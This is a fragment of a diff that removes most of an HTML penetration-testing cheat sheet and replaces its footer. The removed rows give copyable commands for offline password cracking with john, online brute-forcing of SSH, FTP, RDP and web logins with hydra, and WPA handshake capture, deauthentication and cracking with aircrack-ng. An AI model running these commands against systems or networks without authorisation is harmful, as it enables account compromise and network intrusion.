-            <span class="cmd-line">zip2john file.zip > hash.txt &amp;&amp; john hash.txt</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">CPU hash cracking; extract hashes from zip/pdf/SSH keys via *2john helpers</td>
-        </tr>
-
-        <tr data-cat="password">
-          <td class="tool-name">hydra</td>
-          <td class="phase"><span class="badge badge-password">password</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">hydra -l admin -P rockyou.txt ssh://&lt;ip&gt;</span>
-            <span class="cmd-line">hydra -L users.txt -P pass.txt ftp://&lt;ip&gt;</span>
-            <span class="cmd-line">hydra -l admin -P pass.txt http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"</span>
-            <span class="cmd-line">hydra -t 4 -l root -P pass.txt rdp://&lt;ip&gt;</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Online brute-force: SSH, FTP, HTTP forms, RDP, SMTP, SMB</td>
-        </tr>
-
-        <!-- ── WIRELESS ── -->
-        <tr data-cat="wireless">
-          <td class="tool-name">aircrack-ng</td>
-          <td class="phase"><span class="badge badge-wireless">wireless</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">airmon-ng start wlan0</span>
-            <span class="cmd-line">airodump-ng wlan0mon</span>
-            <span class="cmd-line">airodump-ng -c 6 --bssid &lt;mac&gt; -w cap wlan0mon</span>
-            <span class="cmd-line">aireplay-ng -0 10 -a &lt;bssid&gt; wlan0mon</span>
-            <span class="cmd-line">aircrack-ng cap-01.cap -w rockyou.txt</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">WPA/WPA2 handshake capture + offline crack; WEP crack; deauth attack</td>
-        </tr>
-
-      </tbody>
-    </table>
-    <div class="no-results" id="no-results">No tools match this filter.</div>
-  </div>
 </main>
 
-<footer>
-  White Hat Hacker Tools Cheat Sheet &mdash;
-  Use responsibly and legally &mdash;
-  <a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">MSF Unleashed</a> ·
-  <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a> ·
-  <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener">HackTricks</a>
-</footer>
+<footer>ops://cheatsheets &mdash; use responsibly and legally</footer>
 
-<script>
-(function () {
-  const btns    = document.querySelectorAll('.f-btn');
-  const rows    = document.querySelectorAll('#tbody tr[data-cat]');
-  const countEl = document.getElementById('count-n');
-  const noRes   = document.getElementById('no-results');
-
-  function filter(cat) {
-    let shown = 0;
-    rows.forEach(r => {
-      const match = cat === 'all' || r.dataset.cat === cat;
-      r.style.display = match ? '' : 'none';
-      if (match) shown++;
-    });
-    countEl.textContent = shown;
-    noRes.style.display = shown === 0 ? 'block' : 'none';
-  }
-
-  btns.forEach(b => {
-    b.addEventListener('click', () => {
-      btns.forEach(x => x.classList.remove('active'));
-      b.classList.add('active');
-      filter(b.dataset.cat);
-    });
-  });
-
-  window.copyAll = function (btn) {
-    const block = btn.closest('.cmd-block');
-    const lines = Array.from(block.querySelectorAll('.cmd-line'))
-      .map(l => l.textContent.replace(/^# /, '# '))
-      .join('\n');
-    navigator.clipboard.writeText(lines).then(() => {
-      btn.textContent = 'copied!';
-      btn.classList.add('copied');
-      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
-    });
-  };
-})();
-</script>
 </body>
 </html>
